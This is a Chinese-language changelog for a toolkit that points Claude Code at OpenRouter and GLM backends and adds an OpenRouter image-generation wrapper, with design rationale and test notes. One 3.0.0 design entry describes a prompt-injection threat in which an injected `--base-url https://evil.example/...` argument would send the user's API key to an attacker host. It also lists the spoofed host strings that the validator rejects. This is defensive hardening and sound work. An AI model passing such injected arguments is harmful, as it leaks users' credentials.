# 更新日志

> **翻译落后**：2.18.0 ~ 2.18.3 尚未翻译，请看 [CHANGELOG.md](CHANGELOG.md)。

## [3.0.0] - 2026-08-15

### 新功能
- **新增 `or` 后端 —— OpenRouter 的 Anthropic 兼容端点，直连。** `profiles/or.json` 完全照 `glm.json` 的形状：`service` 为 `null`，不拉起任何代理，也不安装任何东西。`ANTHROPIC_BASE_URL` 是 `https://openrouter.ai/api`（结尾没有 `/v1` —— Claude Code 会自己拼 `/v1/messages`），四个模型槽位映射到 `deepseek/deepseek-v4-pro`（opus、sonnet）与 `deepseek/deepseek-v4-flash`（haiku、fable）。`cl_or` / `cl_or_auto` 由 `claude.zsh` 从 profiles 的 glob 结果自动生成，因此启动器一行都不用改。
- **`gpt` 与 `ccr` 在安装器 "Model Backends" 分组里不再默认勾选**，`or` 默认勾选。只改了这两项 `GROUP_ITEMS` 条目的 `default_on` 那一列 —— 没有删除任何代码、模板或 `configure_*` 函数。两者的描述文案也补上了依赖（"needs cliproxyapi"、"manual web-UI setup"），让依赖在做选择的当下就可见。
- **`--all` 安装全部后端，现在包含 `or`**：`SELECTED_PROFILES=("glm" "or" "gpt" "ccr")`。
- **`cl_commands_hint()` 的启动器表格加入 `cl_or`**。

- **BREAKING：出图链路从 CLIProxyAPI 换成 OpenRouter。** 始终安装的 `sinedied/agent-skills:image-gen` Skill 现在由 `scripts/image-gen-openrouter.py` 驱动 —— 一个零依赖的 Python 包装器，用 `openai/gpt-image-2` 直接 POST 到 `https://openrouter.ai/api/v1/images`。538 行的 `scripts/image-gen-cliproxyapi.sh` 被删除，随之消失的还有 CLIProxyAPI 二进制依赖、`v7.2.17` 最低版本要求、环回 `:8317` 端点、`/healthz` 存活探针、本地 client key 读取，以及 ChatGPT/Codex OAuth 依赖。出图不再需要任何本地服务处于运行状态。
- **上游的 `image_gen.py` 不再被执行。** 它的 `/v1/images/generations` 与 `/v1/images/edits` 路由在 OpenRouter 上不存在；`edit` 改为在同一生成端点上用 `input_references` 表达。安装器仍然校验 `scripts/image_gen.py` 存在，但这已纯粹是对 npx 下载产物的完整性检查。
- **严格 fail-closed 的模型预检，不留逃生舱。** 每次调用都先打 `GET /api/v1/images/models`，目标模型不在列表里、或列表无法解析，一律退出 `4`，并打印前几个真实可用的 id。刻意**不**提供任何 `SKIP_MODEL_CHECK` 之类的 bypass 开关。
- **参数面更宽，`--output` 语义不变。** `-o/--output` 与上游逐条一致（file/dir 模式判定、`_N` 后缀、绝不覆盖）。`--size` 新增 `512`/`1K`/`2K`/`4K` 档位与任意 `WxH`；`-i/--image` 在本地路径之外新增 http(s) URL 支持；新增 `--aspect-ratio`、`--resolution`、`--seed`。`--api-key`、`--base-url` 与 `--mask` 接受但拒绝并解释原因，`--moderation` 接受但忽略。退出码从一律 `1` 改为 `0`/`1`/`2`/`3`/`4` 分级。
- **`~/.claude` 下残留的 `scripts/image-gen-cliproxyapi.sh` 会在下次安装时自动删除**，两个安装器都新增了 `SUPERSEDED_USER_SCRIPTS` 清理环节。不这么做的话该文件会变成孤儿 —— 卸载循环只认当前的 `USER_SCRIPTS`。
- **修复：`install.ps1` 找的是 `image-gen\image_gen.py` 而非 `image-gen\scripts\image_gen.py`**，`Update-ImageGenSkillInstructions` 和还原路径校验两处都有。因此注入在每一次 Windows 运行上都失败，并连带把整个 image-gen 安装拖垮（表现为 warn，不是致命错）。修复前 Windows 上的 image-gen 安装是 100% 失败的。
- **修复：两个安装器注入的 SKILL.md 引导块内容不一致**（PowerShell 版多了 5 行 WSL 说明），导致在同一 `~/.claude` 上交替运行两个安装器会每次都重写 SKILL.md。现已逐字节相同，且两边都加了注释说明必须保持一致。
- **删除死目录 `skills/generate-image/`** —— 4 个孤立的 `.pyc`，无源码、全仓零引用。

### 设计理由
- **`ANTHROPIC_API_KEY` 取空串、写在 `env` 里，并刻意不进 `credentialKeys`。** OpenRouter 用 `Authorization: Bearer` 鉴权，而 Claude Code 只在 `ANTHROPIC_API_KEY` 为假值时才发这个头 —— 只要它有任何值就会切到 `x-api-key`，把请求当成直连 Anthropic，OpenRouter 的 token 便一次都发不出去。写在 `env` 而不是 `unset[]`，是因为 `unset[]` 执行的是真正的 `unset`，与"值为空"不是一回事，而这里需要的语义就是空串。这条机制是实测过的、不是推断：`_cl_profile_env_pairs`（`claude.zsh:484-498`）只拒绝 `array`/`object` 类型的值，把它的 jq filter 原样跑一遍 `profiles/or.json`，确实输出了 `ANTHROPIC_API_KEY=` 这一行；注入循环（`claude.zsh:736-741`）判空的是**键**不是值，因此 export 成立。不进 `credentialKeys` 意味着重装合并（`install.sh:2192-2199`）每次都从模板把空串写回来，同时也让它不会被占位符扫描扫到 —— 空串本来就不是让用户去填的东西。
- **刻意不加 `_SUPPORTED_CAPABILITIES`。** `glm.json` / `gpt.json` 里那串 `effort,xhigh_effort,max_effort,thinking,adaptive_thinking,interleaved_thinking` 会让 Claude Code 发出 Anthropic 的 thinking/effort 参数，需要 OpenRouter 翻译成 DeepSeek 的 `reasoning` 字段，而 `adaptive_thinking` / `interleaved_thinking` 在 DeepSeek 侧根本没有对应物 —— 在一条没人测过的链路上，这是零星 400 的合理来源。因此留空，并在 `note` 里写明如何逐个加回并测试。
- **不设 `CLAUDE_CODE_ENABLE_GATEWAY_MODEL_DISCOVERY`。** `claude.zsh:555` 的抑制分支只在解析出的槽位变量为**空**时才触发；这里四个槽位全都有值，所以无论设不设，启动器照旧注入 `--model opus`，`/model` 选择器都是预锁定态。设了没有任何行为收益，只多一次每次启动的模型列表往返。本 profile 所照抄的直连范本 `glm.json` 同样没设。
- **`gpt` / `ccr` 降级，是因为两者装完都不能直接用。** `gpt` 需要一个外部 `brew` 二进制，外加一次有真实封号风险的逆向 OAuth 流程；`ccr` 把配置存在 SQLite 里，必须手工在 web UI 中配一遍。两者都属于"能装上、装上也不能用"的后端 —— 正是 2.21.0 把 `adversarial-review` 移出默认路径时所针对的那种依赖形态，这里适用同一套理由。

- **key 只从 `profiles/or.json` 读，不做 `OPENROUTER_API_KEY` 兜底。** 同一个 token 开两个凭据面，必然漂移；而且仓库既有的心智模型就是"凭据集中在 `~/.claude/profiles/*.json`，重装时靠 `credentialKeys` 保留"。代价是明确的：出图现在要求 OpenRouter 后端已安装并填好 key，即便你从不用 `cl_or` 聊天。key 仅作为 `Authorization` 请求头使用 —— 绝不进 argv、子进程环境、stdout、stderr 或任何错误信息 —— 并限制字符集为 `[A-Za-z0-9._~-]+`，杜绝用换行注入伪造请求头。未填写的 `YOUR_*` 占位符被当作"没有 key"，而不是拿去打 API 收一个 401。
- **目标 host 与 key 本身受同等强度的保护。** 只拒绝 `--api-key` 是没有意义的，只要**端点**还能随意指定 —— `Authorization: Bearer <真实 key>` 会跟着 base URL 指向的任何 host 发出去，于是被 prompt injection 塞进参数表的 `--base-url https://evil.example/api/v1` 可以在完全遵守 `--api-key` 禁令的前提下把 token 送走。因此 `--base-url` 与 `--api-key` 同等处理：直接拒绝（退出 `2`，且从 `--help` 隐藏）—— argv 才是 prompt injection 能控制的面，而正常使用根本不需要它。`IMAGE_GEN_BASE_URL` 保留，因为环境变量不具备同样的可达性，但现在限定为 `openrouter.ai` 及其子域走 https，外加 `127.0.0.1` / `[::1]` / `localhost` 走 http(s) 以保住 stub server 测试路径。匹配基于解析出的 hostname 精确比较，绝不用子串判断 —— `https://openrouter.ai.evil.com` 与 `https://evil.com/?x=openrouter.ai` 均被拒。该校验在读取 key 之前执行，所以非法 host 会以自己的错误信息失败，而不是被"缺少凭据"的报错掩盖。
- **包装器用 Python 而非 Bash。** 要做的是 base64 编解码、JSON 构造、data URL 拼装；纯 Bash 意味着内嵌三四段 `python3 -c` heredoc（旧包装器已经这么干了两处）。`python3` 本来就是硬依赖，而 `argparse` 保证 flag 语义与上游对齐的可靠性远高于手写 getopt。代价：这是仓库第一个 `.py` 文件，`bash -n` 覆盖不到它，验证清单里因此补上了 `python3 -m py_compile`。
- **刻意去掉了上游的 `.env` 自动加载。** `image_gen.py` 会从 CWD 一路向上找 `.env` 并注入环境。在任意用户仓库里出图，不该读到该仓库的密钥。
- **所有权校验接受旧的 marker 与 manifest，但只写入新的。** 这是整个改动里最重要的一条。SKILL.md 的标记和 manifest 的 `wrapper=` 行都变了。不做兼容的话，所有存量安装都会过不了 `_image_gen_manifest_valid`、过不了 `_image_gen_dir_owned`，落到"目录存在但不是 installer 安装的"分支，然后被**永久跳过** —— 每次升级只打一条 warn，出图能力冻结在已被删除的 CLIProxyAPI 包装器上。新增的 `_image_gen_manifest_valid_any` / `_image_gen_markers_strict_any` 只用在三个所有权判定点；写入路径与写后自检仍是严格版，所以迁移只发生一次，第二次运行就是纯新格式的幂等路径。注入前会先剥离旧块再插入新块，迁移后的 SKILL.md 只有一对标记而不是两对。

### 注意事项
- **`or` 后端从未对真实的 OpenRouter key 跑过。** 任务书里那一步阻断性的 curl 实测按用户决定跳过（当前没有 key），因此 DeepSeek 经 OpenRouter 的 Anthropic skin 走 `tool_use` 往返是否真的可用，**尚未验证**。OpenRouter 官方的措辞是该原生端点"只保证与 Anthropic 第一方 provider 配合工作" —— 这是不保证，不是硬拒绝，而且正反两方向都不存在公开实测报告。已验证的是凭证守卫的**失败**路径（未填 key 时 `cl_or` 报占位符错误并中止，不会发出任何网络请求）；happy path 未验证。
- **默认值变更对存量用户无影响。** `install_profiles()` 只遍历选中集合、不做反向清理，因此已经装好的 `~/.claude/profiles/gpt.json` / `ccr.json` 不会被任何一次升级删除，`configure_ccr_profile` 也仍按该文件是否存在触发。
- **`--all` 同时也是非 TTY 下 `curl | bash` 的回退路径**，那条路径仍然会安装 `gpt` 与 `ccr`。新的默认值只对交互式选择器生效。
- **`or` 没有 5h 额度条。** `hooks/statusline.sh:85-90` 按 `$ANTHROPIC_BASE_URL` 选数据源，只认识 `bigmodel.cn` / `z.ai`；更根本的是 OpenRouter 压根没有 5 小时滚动窗口 —— 它只有 `/api/v1/credits` 的余额，那是钱而不是"窗口已用百分比"，硬塞进去只会渲染出一个语义错误的进度条。
- **一个上下文上限管所有槽位。** `CLAUDE_CODE_MAX_CONTEXT_TOKENS` 是客户端全局值，设为 `1000000` 以匹配两个 DeepSeek V4 模型。把任何槽位改到 163K 上下文的模型（`deepseek/deepseek-v3.2`、`deepseek/deepseek-chat`）都必须手工调低它。`deepseek/deepseek-reasoner` 在 OpenRouter 上不存在 —— 那个 id 属于 DeepSeek 官方 API。
- **`install.ps1` 未做任何改动。** 它完全没有 profile / launcher 支持（`grep -c profile install.ps1` 为 0）；Windows 侧只有状态栏。
- **已验证**：`bash -n install.sh` 在 bash 5.3 与系统 bash 3.2.57 下、以及 `zsh -n claude.zsh`，退出码均为 0；`jq empty profiles/*.json` 无输出；把 `_cl_profile_env_pairs` 的 filter 原样跑 `profiles/or.json`，恰好输出一行 `ANTHROPIC_API_KEY=`；占位符扫描只返回 `ANTHROPIC_AUTH_TOKEN`；十二个 `ANTHROPIC_DEFAULT_*` 槽位键齐全，`_SUPPORTED_CAPABILITIES` 为 0 个。在一次性的临时 `HOME` 下：交互式默认选择只装出 `claude.json`、`glm.json`、`or.json`，没有 `gpt.json` / `ccr.json`；`--all` 五个全装；source 安装好的 `claude.zsh` 之后 `cl_or` 与 `cl_or_auto` 均已定义；未填 key 时 `cl_or` 以退出码 1 报占位符错误；安装尾部的待配置清单中 `[or]` 只有 `key` + `guide` 两步（因 `service` 为 `null`，没有 install / login 子步骤）；对手工改过的 profile 重装一次，`ANTHROPIC_AUTH_TOKEN` 被保留，而 `ANTHROPIC_API_KEY` 被重置回 `""`、非凭证键被重置回模板值。

- **对存量用户是 BREAKING：不配 OpenRouter 就出不了图。** 迁移步骤：重跑安装器 → 在 "Model Backends" 分组勾选 **OpenRouter** → 把 <https://openrouter.ai/keys> 的 key 填进 `~/.claude/profiles/or.json` 的 `.env.ANTHROPIC_AUTH_TOKEN`。在填好之前，包装器会退出 `3` 并给出明确说明。旧的 `~/.claude/scripts/image-gen-cliproxyapi.sh` 由同一次安装自动删除，无需手工清理。已有的 `~/.claude/skills/image-gen/` 安装会被就地迁移而不是跳过（见上面的所有权说明）。
- **OpenRouter 出图链路从未用真实 key 跑通过。** 没有端到端出图、没有图生图往返验证，请求/响应形状也未与真实 API 核对过。`input_references` 的对象形状来自 OpenRouter 公开文档，不是实际观测到的请求。
- **最大的单点未验证风险：`openai/gpt-image-2` 是否真的出现在 `GET /api/v1/images/models` 里。** 该端点需要鉴权，无法查询。此前证实的是该 id 出现在 `GET /api/v1/models?output_modalities=image` —— 那是**另一个**端点，两个列表未必完全一致。若两者不一致，fail-closed 预检会拦下所有请求。这个失败是响亮且可自救的（错误信息会列出前几个真实可用的 id，`--model` 可覆盖），而不是静默的，但拿到 key 后第一件事就该验它。
- **`size` / `quality` / `background` / `output_compression` 在 `openai/gpt-image-2` 上是否被支持，未经验证。** `GET /api/v1/images/models/{id}/endpoints` 能给出按模型的 `supported_parameters`，但需鉴权。不支持的参数预期由 API 返回 4xx，包装器会原样透传。
- **`install.ps1` 改了但没跑过。** 本环境没有 `pwsh`，连语法检查都跳过了 —— PowerShell 侧的改动（旧块字节级剥离、`*Any` 校验器、两处路径修复、超期脚本清理）全部只靠与 Bash 实现的对照审查支撑。其中 `Update-ImageGenSkillInstructions` 里的字节级旧块剥离风险最高，需要真实 Windows 环境验证。
- **两侧旧块剥离现在在畸形输入上行为一致。** 双方都只在"恰好一个旧 BEGIN + 恰好一个旧 END + BEGIN 在 END 之前"时才删除该区间；其余任何形态（没有、成对重复、只有一侧、END 先于 BEGIN）一律恒等变换，把文本留给当前标记的校验去判定。Bash 侧此前用的是无状态 `awk` skip 开关，意味着只要出现一个没有配对的旧 BEGIN —— 手工编辑过的 SKILL.md、上次安装中途失败、或者文件里恰好有一行等于旧 marker 文本 —— `skip` 就会永久锁死，**丢弃该行之后的全部内容**，包括其下方完好的当前标记块。被截断的文件随后过不了严格校验，静默退化成 append 模式，再以零退出码、无任何 warn 的方式覆盖回 SKILL.md。修复前已复现（8 行样本被吃到只剩 1 行），修复后七种形态逐一确认正常。
- **本次已验证**：`bash -n install.sh` 在 bash 5.3 与系统 bash 3.2.57 下均退出 0；新包装器的 `python3 -m py_compile` 与三种 `--help` 均正常；`jq empty profiles/*.json` 干净；`scripts/check-readme-sync.sh` 通过；两个安装器的 SKILL.md 引导块经 `cmp` 确认逐字节相同。对本地 stub HTTP server：真 PNG 被解码落盘、路径打到 stdout、`revised_prompt` 打到 stderr、key 只出现在 `Authorization` 头、嵌套输出目录会被创建、已存在的目标绝不覆盖（`pic.png` → `pic_2.png`）、`edit` 发出的 `input_references` 是形状正确的 base64 data URL 条目。把 stub 的模型列表改成不含目标模型后，运行退出 `4` 且**零** POST 请求，fail-closed 得到确认。一个 25 条断言的 harness 直接跑真实 `install.sh` 函数，覆盖幂等性（两次注入逐字节相同、恰好一对标记）与完整的旧版升级路径：CLIProxyAPI 时代的 manifest 与标记块被认成 owned、旧块被剥离、恰好一个新块取而代之且前后散文保留、manifest 被改写为标准格式、之后再跑一次逐字节相同。在临时 `CLAUDE_DIR` 下，`install_scripts` 安装了可执行的新包装器并删除了超期的旧包装器，而 `--dry-run` 只报告这两个动作、不落盘。旧块剥离针对七种标记形态重跑（8 行未闭合 BEGIN 复现用例、0 对、恰好一对合法、两对、只有 BEGIN、只有 END、顺序颠倒），只有单一合法对被删除，其余输入逐字节原样透传。`--base-url` 退出 `2` 且不回显 key，也不出现在 `--help` 中；`IMAGE_GEN_BASE_URL` 对 `evil.example`、`openrouter.ai.evil.com`、`evil.com/?x=openrouter.ai`、`notopenrouter.ai`、`file://` URL 以及明文 http 的 `openrouter.ai` 均退出 `2`，而 `openrouter.ai`、`api.openrouter.ai` 与三种 loopback 写法均放行进入 key 查找。两个 stub 场景在新校验下行为不变：loopback base URL 正常出图并写出 `image_1.png`、key 只出现在 `Authorization` 头，未列出的模型退出 `4` 且 `posts: 0`。

## [2.21.0] - 2026-08-15

### 新功能
- **`adversarial-review` 不再默认安装。** 两个安装器（`install.sh`、`install.ps1`）Review 分组里的这一项由默认勾选改为默认不勾选，`--all` / `-All` 分支（同时也是非 TTY 下 `curl | bash` 的回退路径）也不再置上 review 标志。该项仍然留在选择器里：用户手动勾选后，skill 照常安装、CLAUDE.md 的规则照常指向它。没有删除任何东西 —— `skills/adversarial-review/` 原样保留，`--all` 依旧会拷贝包括它在内的全部内置 skill。
- **CLAUDE.md 里 Code Review 那句话的默认版本改为 `code-reviewer` agent。** 两个 review 标志都为 false 时，`install_claude_md()` 走它原有的 `else` 分支，写入 "use the `code-reviewer` agent to perform it"。三个分支的措辞本身没有改动。

### 修复
- **在 macOS 上，无论选了什么，安装器写进 CLAUDE.md 的都是仓库里自带的那句措辞。** 这一行原本靠 `sed '/^Whenever a code review is needed/c\'"$review_line"` 替换，而 BSD sed 直接拒绝这种写法 —— `sed: 1: "/^Whenever a code revie ...": extra characters after \ at the end of c command`，退出码 1 —— 于是 `&& mv` 从未执行，临时文件保留的还是仓库默认文本。因此每一次 Mac 安装拿到的都是 adversarial-review 那句话，包括选了 Codex 的和两个都没选的。现改用 `awk` 完成替换，它是 POSIX 的，两个平台行为一致。这个 bug 是既有的、不是本次引入的，但正是它会让上面那个默认值改动在占多数的平台上被静默吞掉。

### 设计理由
- **这个 skill 有一条默认安装满足不了的硬依赖。** `skills/adversarial-review/SKILL.md:16` 明确要求 reviewer 必须经由对面模型的 CLI（`codex exec`）运行，并明令禁止用 subagent 或 Agent tool 顶替。而默认安装里没有任何一步会带来 `codex` —— `review-codex` 一直是默认关闭的，何况两者本来就互斥。所以此前的默认值等于给用户一份 CLAUDE.md，其 Code Review 规则指向一条在没装 codex CLI 的机器上根本跑不通的路径。那句话里的 fallback 子句能兜底，但第一条指令仍然点名了一个跑不起来的 skill。默认关掉之后，默认规则链的终点是一个永远可用的位置。
- **`--all` 也置为 false，尽管"全都装"的语义看起来支持 true。** 这个标志并不决定 skill 装不装 —— `SELECTED_SKILLS` 为空时 `install_skills()` 会拷贝 `skills/` 下的每一个目录，而 `--all` 恰恰就是这种情况 —— 它只决定 CLAUDE.md 里落哪一句话。而 `--all` 并**不**安装 codex CLI（`review-codex` 在那里同样是关的），所以保持 true 会凑出最差的组合：一份要求 codex 的 review 规则，配上一个刻意不含 codex 的安装。`--all` 仍然会装上 skill 文件，只是不再把规则接到它上面。`install.ps1` 的 `-All` 同理。
- **交互式的"全选"键（`a`）仍然保留 adversarial 开启。** 那条路径必须以某种方式打破 adversarial/codex 互斥，而既有的选择 —— adversarial 胜出、codex 关闭 —— 是用户主动按键要求装满该分组的结果，不是默认值。这次只订正了注释，因为它把这个状态描述成了"(default)"。

### 注意事项
- **存量安装不做迁移。** 本次发布之前装过的用户，仍然保留 adversarial-review skill 和 adversarial 版本的 CLAUDE.md 那句话，直到重新跑一次安装器。交互式重跑且不勾选该项会把两者都清掉（`install_skills()` 里的未选中 skill 清理逻辑负责删目录）；用 `--all` 重跑则会改写 CLAUDE.md 那一行、但按上述理由保留 skill 文件。
- **两个安装器里该项的描述文案加上了 "needs codex CLI"**，让这条依赖在做选择的当下就可见，而不是等到 skill 跑不起来才发现。
- **已验证**：`bash -n` 在 bash 5.3 与系统 bash 3.2.57 下均通过；`install.sh --dry-run` 退出码 0，输出 `Code Review: adversarial=false codex=false`，同时仍然列出 `skills/adversarial-review/` 的拷贝动作；`install_claude_md()` 针对沙箱 `CLAUDE_DIR` 跑遍三种标志组合，分别产出 code-reviewer、adversarial、codex 三句话（在 awk 修复之前，三种组合产出的都是 adversarial 那句）；互斥辅助函数在两项都关闭的初始状态下重跑，确认它只在"打开某项"时触发，两项都关是稳定状态而非异常分支。
- **`install.ps1` 未实际执行。** 验证机器上没有 PowerShell；它的两处改动是照 `install.sh` 镜像修改的，只做了静态阅读检查。

## [2.20.0] - 2026-08-14

### 新功能
- **状态栏的 5h 额度条现在跟随当前终端实际使用的后端。** 此前它只认识一个端点 —— `api.anthropic.com/api/oauth/usage` 加上从钥匙串取出的 OAuth token —— 所以跑 `cl_glm_auto` 的终端要么显示的是另一个账号的数字，要么干脆什么都不显示。现在后端由 `$ANTHROPIC_BASE_URL` 推导：为空即原生 Anthropic，走原有路径且行为不变；含 `bigmodel.cn` 或 `z.ai` 即智谱 GLM Coding Plan；其余（`127.0.0.1:8317` 的 gpt 代理、`127.0.0.1:3456` 的 ccr 网关）没有可对话的额度端点，整个额度段不渲染。
- **GLM 额度取自 `{scheme}://{host}/api/monitor/usage/quota/limit`**，即智谱官方 `glm-plan-usage` 插件所用的端点。host 从 `$ANTHROPIC_BASE_URL` 推导而非硬编码，因为国内版是 `open.bigmodel.cn`，国际版是 `api.z.ai`。Authorization 直接用裸的 `$ANTHROPIC_AUTH_TOKEN` —— 这个端点加 `Bearer ` 前缀会 401。
- **非原生后端的额度段带标签。** GLM 显示为 `glm 5h`；裸 `5h` 仍然表示原生 Anthropic 额度。两者复用同一套 `build_bar()` 渐变条，且都保持"没数据就整段消失"的行为。
- **缓存与锁的文件名带后端指纹**（`claude-usage-cache-anthropic.json`、`claude-usage-cache-glm-<校验和>.json`），取代原来单一的全局 `claude-usage-cache.json`。
- **`CL_NO_USAGE` 是总开关。** 在 `~/.zshrc` 里 `export CL_NO_USAGE=1` 会把后端强制置为 `other`，任何后端都不再抓取额度、也不渲染额度段。它必须 `export`，不能写成 `CL_NO_USAGE=1 cl_glm` 这种一次性前缀赋值 —— 与 `CL_MODEL` 不同，启动器不会把它再导出给状态栏进程。命名对齐已有的 `CL_NO_FABLE_WARN`。
- **凭据改为经 stdin 传给 `curl`，不再进 argv。** 两条抓取路径都把请求头写进 `curl -K -` 的配置流，取代原先的 `-H "Authorization: …"`，因此 OAuth token 和 GLM plan key 不会再出现在同机其他用户的 `ps` 输出里。验证方式是在一次真实抓取全程采样 `ps -Ao args`：`curl` 的命令行只剩 `-K -` 和 URL，而请求头仍原样到达服务端（用含 `"` 与反斜杠这两个 curl 配置格式唯一需要转义的字符的 token，对本地监听端口实测比对过字节）。

### 设计理由
- **GLM 的刷新 TTL 是 600 秒，而不是原生 API 的 60 秒。** 智谱《使用须知》明确写了平台有限流措施、违规账号可能被限速或冻结，且完整的处罚逻辑不公开。状态栏是**每次渲染**都触发的，活跃会话下远不止一分钟一次，在一个并非公开 API 面的端点上撞到未公开阈值是真实风险。600 秒也是两个已知社区实现各自独立收敛到的值（`cc-zaiquota` 默认 600s，Darkycl 的实现是 5 分钟）。原生路径保持 60 秒，因为那是客户端自己本来就在轮询的第一方端点。
- **负缓存退避值按后端参数化，且永远不短于该后端的 TTL** —— GLM 600 秒、原生 300 秒。若沿用单一硬编码的 300 秒，GLM 在失败时反而会比健康时轮询得更勤（300 < 600），对这个「因为有未公开风控才特意放长 TTL」的后端恰恰是反向的。两个后端的常量现在收在一个 `case` 里而非 `if`/`else`，因为旧的 `else` 分支同时服务 `anthropic` 和 `other`，任何第三个后端进来都会被喂错值。
- **5h 窗口靠「重置时间上界」识别，且只在识别结果无歧义时才采用。** 响应会返回多条 `TOKENS_LIMIT`，窗口大小编码在一个含义未文档化的 `unit` 字段里，不同社区客户端的读法还不一致 —— 有的认 `unit == 3`，有的认 `number == 5`。任何一种都只差上游改一次字段名，就会把多日额度当成 5h 额度静默显示出来，所以这里根本不读任何窗口大小字段。改用的是一条按构造必然成立的上界：5h 窗口的 `nextResetTime` 恒在 now+5h 以内（实现取 6h，留一小时容忍时钟偏移）。**这是启发式而非定义，它本身并不足以唯一确定窗口** —— 周窗口在自己临近重置的那段时间同样满足该上界。因此「过滤后取最早重置的那条」这个看似顺理成章的下一步是错的：每 168 小时里约有 6 小时，它会把周额度贴上 `glm 5h` 标签、显示一个自信的错数。所以只有当过滤后恰好剩一条候选时才采用；剩两条及以上时整段不渲染 —— 缺一条进度条还能从别处查到，显示一个错的百分比则无从察觉。
- **重置时间一律直接取 `nextResetTime`，绝不从整点推算**：GLM 的窗口是**滚动**的 —— 从开启窗口的那次请求起五小时后刷新，任何本地推算出的「下一个 5h 整块」都必然是错的。
- **进到进度条的每个数字都做两道类型校验。** `jq` 归一化要求 `percentage` 与 `nextResetTime` 必须是真正的 JSON number，渲染侧在做任何算术前再把缓存值校验一遍必须是纯十进制数。只校验一道不够：`printf "%.0f" "N/A"` 会**先输出一个 `0` 再失败**，于是旧的 `printf … || echo "$raw"` 会拼出字符串 `0N/A`，再进 `$(( pct * w / 100 ))`，让 bash 把 `value too great for base` 打到 stderr —— 对一个契约就是「静默降级」的组件来说，这是一次肉眼可见的崩溃。
- **陈旧锁的回收动作本身也加了锁。** `stat` → 比较 → 删除 → `mkdir` 之间存在 TOCTOU 窗口：多个渲染可以各自判定同一把锁陈旧，而后到的那个删除会抹掉同伴刚建好的锁，于是出现两个「持锁者」同时打上游 API —— 恰恰是长 TTL 想避免的并发流量。现在回收必须先抢到第二把 `mkdir` 锁，抢到后再重新做一次陈旧判定。这把回收锁自身同样适用 120 秒陈旧规则，所以进程在回收中途被杀不会变成新的永久死锁源。
- **缓存按指纹分文件，因为用户会在同一台机器上同时跑两个后端。** 单一全局缓存文件的话，两个终端会交替覆盖对方，各自有一半时间显示的是对方的数字。指纹 = 后端名 + 凭据的 `cksum`，所以换 GLM 账号、或国内与国际两个 key 并用，也会落到不同文件。用 `cksum` 而不是 `shasum`/`md5`，是因为它是 POSIX 的、Git Bash 下必定存在，后两者则不保证。token 只参与哈希，绝不出现在文件名里。
- **刷新锁用 `mkdir` 而不是锁文件。** `mkdir` 在目录已存在时原子失败，而旧的 `[ -f ]` 判断再 `echo $$ >` 写入这个序列做不到 —— 恰恰在本次要支持的并发场景下，多个终端会各自判定锁是空的然后一起发请求。超过 120 秒的陈旧锁会被强制回收，避免一次终端被杀就永久堵死刷新。缓存写入先落同目录临时文件再 `mv`，读者永远看不到半截 JSON。

### 注意事项
- **开发与测试全程没有向智谱发过任何真实请求。** 所有测试都用 fixture 缓存驱动渲染，fixture 是把真实响应样本喂给脚本里那个一模一样的 `jq` 过滤器生成的；唯一真正调用 `curl` 的那条用例指向一个故意无法解析的域名，用来覆盖失败分支。端点 URL、鉴权头形态、响应结构来自智谱的 `zai-org/zai-coding-plugins` 以及此前对端点存在性的实测 —— **解析逻辑未经真实响应验证**，若某个账号实际返回的 schema 与样本有出入，表现会是额度段缺失而不是报错。
- **有一种 schema 偏差不会表现为额度段缺失，而且是本次改动里最难发现的失败模式。** 如果 `percentage` 实际是 0–1 的小数而非 0–100，管线里每一道校验都会通过 —— 它是 number、是有限值、算术也成功 —— 进度条会**正常渲染但恒显示 `0%`**。一条永远是空的额度条看起来像「额度没怎么用」，而不像 bug。**收敛方式：拿一次真实渲染结果与智谱官方用量页面的数字对一下。**
- **给定相同的缓存内容，原生 Anthropic 路径的渲染输出无差异**：把同一份 `five_hour` JSON 分别喂给改动前后的脚本，diff 为空。但**缓存文件名变了**：`claude-usage-cache.json` → `claude-usage-cache-anthropic.json`。因此存量用户升级后的第一次渲染读不到旧缓存、没有额度段；后台刷新几秒内落盘，下一次渲染即恢复正常。旧的 `claude-usage-cache.json` 与 `claude-usage-fetch.lock.d` 不做迁移也不删除，会滞留在 `$TMPDIR` 直到系统自己清理。这与 GLM 侧的首帧无额度段是同一回事，此前只写了 GLM 侧、漏了原生侧。
- **已验证**：`hooks/statusline.sh` 与 `install.sh` 在 bash 5.3 和系统 bash 3.2.57 下均通过 `bash -n`。锁在多进程争抢同一把陈旧锁时保持互斥，包括那种会让修复前的回收路径同时放出多个持锁者的交错时序；新鲜锁对所有人阻塞，回收锁的持有者中途死亡也只影响一次尝试、不会长期卡死。缓存写入在并发读写下保持原子。三个身份（原生、`open.bigmodel.cn` key A、`api.z.ai` key B）并排渲染，各自读各自的缓存，无串台。所有失败路径 —— `other` 后端、有 GLM base URL 但无 token、域名不可达、`percentage` 为非数字/null/缺失、缓存文件损坏 —— 退出码均为 0、stderr 均为空，状态栏仅缺失额度段。
- **GLM 终端的缓存若超过 30 分钟，额度段会消失**，直到下一次后台刷新落盘（即下一次渲染）。这是长 TTL 的既定取舍而非缺陷，但确实意味着新开终端的第一次渲染通常没有额度段。
- **`ANTHROPIC_AUTH_TOKEN` 为空时会回退读 `ANTHROPIC_API_KEY`**，但 `profiles/glm.json` 设的是前者，所以这只是防御性处理。
- **后端识别是对 `$ANTHROPIC_BASE_URL` 做子串匹配。** 未来若出现某个含 `z.ai` 的非 GLM 端点会被误判。识别基于环境变量，因此可靠性取决于启动器的导出 —— `profiles/claude.json` 显式 unset 了 `ANTHROPIC_BASE_URL`，用户 shell 配置里也没有导出任何 `ANTHROPIC_*`，所以空值确实代表原生。

## [2.19.0] - 2026-08-10

### 修复
- **所有非 Anthropic 后端的后台请求一直在静默 400，因为本仓库从来不知道 `fable` 这个模型槽位的存在。** Claude Code 解析的是五个槽位而不是四个：除 `opus` / `sonnet` / `haiku` 外还有 `ANTHROPIC_DEFAULT_FABLE_MODEL`（已对照发行版二进制确认，该变量及其 `_NAME` / `_DESCRIPTION` / `_SUPPORTED_CAPABILITIES` 兄弟变量都在）。没有任何 profile 设过它，`claude.zsh` 的槽位表里也没有它，于是客户端对所有后台请求（`/compact`、会话标题、配额探测）都退回到字面量 id `claude-fable-5`。网关发布的是 `provider/model` 形式的 id，Anthropic 兼容的厂商端点发布的是自己的目录，两者都没有 `claude-fable-5`，所以这些请求全部在模型解析阶段失败。实测一天的 CCR 请求日志：**53 条 4xx 里有 48 条**是这个原因，报文都是 `{"message":"All target providers failed.","attempts":[{"stage":"model_resolution","message":"Model \"claude-fable-5\" is not configured for target provider openai. Allowed models: glm-5.2, glm-4.7, glm-5-turbo"}]}`。
